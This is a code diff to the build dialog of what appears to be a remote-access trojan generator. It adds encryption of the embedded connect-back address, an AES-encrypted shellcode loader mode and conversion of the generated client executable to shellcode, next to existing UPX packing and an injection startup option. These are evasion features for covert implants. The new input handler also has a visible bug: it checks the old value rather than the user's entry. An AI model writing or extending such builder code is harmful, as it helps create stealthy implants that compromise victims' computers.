@@ -64,6 +64,7 @@ CBuildDlg::CBuildDlg(CWnd* pParent)
     , m_strPort(_T(""))
     , m_strFindden(FLAG_FINDEN)
     , m_sGroupName(_T("default"))
+    , m_strEncryptIP(_T("是"))
 {
 
 }
@@ -95,6 +96,7 @@ BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
     ON_CBN_SELCHANGE(IDC_COMBO_EXE, &CBuildDlg::OnCbnSelchangeComboExe)
     ON_COMMAND(ID_HELP_PARAMETERS, &CBuildDlg::OnHelpParameters)
     ON_COMMAND(ID_HELP_FINDDEN, &CBuildDlg::OnHelpFindden)
+    ON_COMMAND(ID_MENU_ENCRYPT_IP, &CBuildDlg::OnMenuEncryptIp)
 END_MESSAGE_MAP()
 
 
@@ -232,7 +234,8 @@ void CBuildDlg::OnBnClickedOk()
         SAFE_DELETE_ARRAY(szBuffer);
         return;
     }
-    if (startup != Startup_InjSC)
+    bool encrypt = m_strEncryptIP == _T("是");
+    if (encrypt && startup != Startup_InjSC)
         g_ConnectAddress.Encrypt();
     try {
         // 更新标识
@@ -290,7 +293,7 @@ void CBuildDlg::OnBnClickedOk()
             run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
             MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + strSeverFile + tip, "提示", MB_ICONINFORMATION);
         } else {
-            if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC) {
+            if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES) {
                 DWORD dwSize = 0;
                 LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, dwSize);
                 if (data) {
@@ -322,6 +325,12 @@ void CBuildDlg::OnBnClickedOk()
                     }
                 }
                 SAFE_DELETE_ARRAY(data);
+            }
+            else if (m_ComboCompress.GetCurSel() == CLIENT_PE_TO_SEHLLCODE) {
+                int pe_2_shellcode(const std::string & in_path, const std::string & out_str);
+                int ret = pe_2_shellcode(strSeverFile.GetString(), strSeverFile.GetString());
+                if (ret)MessageBox(CString("ShellCode 转换异常, 异常代码: ") + CString(std::to_string(ret).c_str()), 
+                    "提示", MB_ICONINFORMATION);
             }
             MessageBox("生成成功! 文件位于:\r\n" + strSeverFile + tip, "提示", MB_ICONINFORMATION);
         }
@@ -382,7 +391,8 @@ BOOL CBuildDlg::OnInitDialog()
 
     m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "无");
     m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
-    m_ComboCompress.InsertString(CLIENT_COMPRESS_SC, "SHELLCODE");
+    m_ComboCompress.InsertString(CLIENT_COMPRESS_SC_AES, "ShellCode AES");
+    m_ComboCompress.InsertString(CLIENT_PE_TO_SEHLLCODE, "PE->ShellCode");
     m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);
 
     m_OtherItem.ShowWindow(SW_HIDE);
@@ -453,4 +463,18 @@ void CBuildDlg::OnHelpFindden()
     if (dlg.DoModal() == IDOK) {
         m_strFindden = dlg.m_str;
     }
+}
+
+
+void CBuildDlg::OnMenuEncryptIp()
+{
+	CInputDialog dlg(this);
+	dlg.m_str = m_strEncryptIP;
+	dlg.Init("加密远程地址", "请输入是或者否:");
+	if (dlg.DoModal() == IDOK ) {
+        if (m_strEncryptIP != "是" &&  m_strEncryptIP != "否") {
+            MessageBoxA("请输入是或者否!", "提示", MB_ICONINFORMATION);
+        }else 
+            m_strEncryptIP = dlg.m_str;
+	}
 }
